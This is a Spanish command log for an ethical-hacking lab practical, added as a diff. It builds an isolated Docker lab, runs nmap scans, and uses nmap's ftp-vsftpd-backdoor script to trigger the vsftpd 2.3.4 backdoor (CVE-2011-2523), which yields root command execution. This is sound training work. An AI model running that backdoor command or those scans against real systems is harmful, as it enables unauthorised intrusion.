@@ -1,0 +1,59 @@
+PRÁCTICA 01 - FIRSTHACKING | Comandos utilizados
+=================================================
+
+--- Preparación del entorno (Debian en WSL2) ---
+ps -p 1 -o comm=                 # Comprobar que systemd es el gestor de servicios
+# Instalación de Docker Engine (repositorio oficial de Docker para Debian)
+sudo apt update
+sudo apt install -y ca-certificates curl
+sudo install -m 0755 -d /etc/apt/keyrings
+sudo curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc
+sudo chmod a+r /etc/apt/keyrings/docker.asc
+# (repositorio añadido en /etc/apt/sources.list.d/docker.sources)
+sudo apt update
+sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
+sudo systemctl enable --now docker
+sudo systemctl is-active docker
+sudo docker run --rm hello-world
+
+--- Paso 1. Carpetas de trabajo ---
+mkdir -p ~/HackEtiLabs/docker/practica-01-firsthacking
+cd ~/HackEtiLabs/docker/practica-01-firsthacking
+mkdir -p origen imagen archivos evidencias/nmap
+touch README.md
+
+--- Paso 2. Cargar la imagen ---
+sudo docker load -i imagen/firsthacking.tar
+sudo docker images
+
+--- Paso 3. Crear la red, el contenedor y obtener la IP ---
+sudo docker network create --internal practica01-red
+sudo docker run -dit --name practica01-firsthacking --network practica01-red firsthacking:latest
+sudo docker ps -a
+sudo docker logs practica01-firsthacking
+IP_OBJETIVO=$(sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' practica01-firsthacking)
+echo "$IP_OBJETIVO"    # Resultado: 172.18.0.2
+
+--- Paso 4. Identificar los servicios ---
+test -n "$IP_OBJETIVO" && nmap -sT -p- --open -n -Pn -oN evidencias/nmap/01-puertos.txt "$IP_OBJETIVO"
+test -n "$IP_OBJETIVO" && nmap -sV -p 21 -n -Pn -oN evidencias/nmap/02-servicio-ftp.txt "$IP_OBJETIVO"
+# Resultado: 21/tcp open ftp vsftpd 2.3.4
+
+--- Paso 6. Comprobación controlada (explotación del backdoor) ---
+test -n "$IP_OBJETIVO" && nmap -n -Pn -p 21 --script ftp-vsftpd-backdoor --script-args 'ftp-vsftpd-backdoor.cmd=hostname' -oN evidencias/nmap/03-validacion.txt "$IP_OBJETIVO"
+sudo docker inspect -f '{{.Config.Hostname}}' practica01-firsthacking
+# Resultado: VULNERABLE (CVE-2011-2523) | id=uid=0(root) | hostname=e752b65db81c (coincide con docker inspect)
+
+--- Paso 8. Empaquetar la imagen y reproducir ---
+sudo docker tag firsthacking:latest hacketilabs:practica01-firsthacking
+sudo docker save -o imagen/laboratorio.tar hacketilabs:practica01-firsthacking
+sudo docker stop practica01-firsthacking
+sudo docker load -i imagen/laboratorio.tar
+sudo docker run -dit --name practica01-comprobacion --network practica01-red hacketilabs:practica01-firsthacking
+IP_OBJETIVO=$(sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' practica01-comprobacion)
+echo "$IP_OBJETIVO"
+test -n "$IP_OBJETIVO" && nmap -sV -p 21 -n -Pn -oN evidencias/nmap/04-reproduccion.txt "$IP_OBJETIVO"
+
+--- Paso 9. Cerrar el laboratorio ---
+sudo docker stop practica01-comprobacion
+sudo docker ps -a    # Ambos contenedores en estado Exited
